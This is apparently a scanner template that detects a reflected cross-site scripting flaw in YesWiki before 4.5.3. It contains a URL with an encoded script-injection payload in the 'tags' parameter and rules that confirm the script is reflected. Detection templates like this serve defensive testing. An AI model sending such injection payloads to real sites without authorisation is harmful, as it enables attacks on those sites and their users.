id: yeswiki-reflected-xss
brief:
    title: YesWiki - Cross-Site Scripting
    by: MuhammadWaseem
    level: high
    about: YesWiki versions < 4.5.3 are vulnerable to multiple reflected cross-site scripting (XSS) vulnerabilities, allowing arbitrary JavaScript execution.
    label:
        - xss
        - yeswiki
        - cms
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/?PagePrincipale/listpages&tags=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E'
      signs:
        - "on": word
          has:
            - <script>alert(document.domain)</script>
            - yeswiki-base
          in: body
          need: all
        - "on": word
          has:
            - text/html
          in: content_type
          need: all
        - "on": status
          status:
            - 200
